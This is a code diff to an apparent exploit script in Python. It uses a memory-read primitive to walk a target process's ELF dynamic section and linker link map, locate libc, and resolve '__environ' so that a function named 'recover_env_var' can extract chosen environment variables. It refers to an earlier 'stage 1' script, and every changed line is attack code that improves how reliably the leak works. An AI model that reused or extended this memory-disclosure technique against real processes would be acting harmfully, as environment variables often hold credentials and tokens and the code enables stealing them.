@@ -123,7 +123,7 @@ def _find_elf_base(read_mem, addr):
     while page >= 0x10000:
         if read_mem(page, 4) == b"\x7fELF":
             return page
-        if page < start - 0x2000000:
+        if page < start - 0x20000000:
             break
         page -= 0x1000
     return 0
@@ -156,28 +156,54 @@ def _parse_dynamic(read_mem, base):
         d_tag, d_val = struct.unpack("<QQ", entry)
         if d_tag == 0:
             break
-        if d_val and d_val < base and d_tag not in (2, 28):
+        # DT_DEBUG (21) is an absolute address filled in by the linker.
+        if d_val and d_val < base and d_tag not in (2, 28, 21):
             d_val += base
         tags.setdefault(d_tag, d_val)
     return tags
 
 
-def _walk_link_map(read_mem, got):
-    got_data = read_mem(got, 24)
-    if len(got_data) < 24:
-        return None
-    cur = struct.unpack_from("<Q", got_data, 8)[0]
-    for _ in range(64):
-        if not cur or cur < 0x10000:
-            return None
-        entry = read_mem(cur, 40)
-        if len(entry) < 40:
-            return None
+def _walk_link_list(read_mem, head):
+    libs = []
+    cur = head
+    while cur and cur > 0x10000 and len(libs) < 128:
+        entry = read_mem(cur, 48)
+        if len(entry) < 48:
+            break
         l_addr, l_name, l_ld, l_next = struct.unpack_from("<4Q", entry)
-        name = read_mem(l_name, 255).split(b"\x00")[0] if l_name > 0x10000 else b""
+        name = b""
+        if 0x10000 < l_name < 0x800000000000:
+            name = read_mem(l_name, 255).split(b"\x00")[0]
+        libs.append(name)
         if b"libc.so" in name or b"libc-" in name:
-            return l_addr
+            return l_addr, libs
+        if not l_next or l_next == cur:
+            break
         cur = l_next
+    return None, libs
+
+
+def _resolve_libc(read_mem, base, tags):
+    """DT_DEBUG -> r_debug.r_map, else DT_PLTGOT -> GOT[1] (same routes as
+    stage 1's diag.py)."""
+    dt_debug = tags.get(21)
+    if dt_debug and 0x10000 < dt_debug < 0x800000000000:
+        rd = read_mem(dt_debug, 24)
+        if len(rd) >= 16:
+            r_map = struct.unpack_from("<Q", rd, 8)[0]
+            if r_map > 0x10000:
+                libc_base, _libs = _walk_link_list(read_mem, r_map)
+                if libc_base:
+                    return libc_base
+    got = tags.get(3)
+    if got:
+        got_data = read_mem(got, 24)
+        if len(got_data) >= 16:
+            own = struct.unpack_from("<Q", got_data, 8)[0]
+            if own > 0x10000:
+                libc_base, _libs = _walk_link_list(read_mem, own)
+                if libc_base:
+                    return libc_base
     return None
 
 
@@ -240,14 +266,16 @@ def recover_env_var(want_key):
     read_mem = pipe.read_mem
 
     base = 0
+    tags = None
     for cand in _candidate_pointers(dcb):
         base = _find_elf_base(read_mem, cand)
         if base:
-            break
-    if not base:
+            tags = _parse_dynamic(read_mem, base)
+            if tags:
+                break
+    if not base or not tags:
         return None
-    tags = _parse_dynamic(read_mem, base)
-    libc_base = _walk_link_map(read_mem, tags.get(3))
+    libc_base = _resolve_libc(read_mem, base, tags)
     if not libc_base:
         return None
     env_addr = _gnu_hash_lookup(read_mem, libc_base, "__environ")
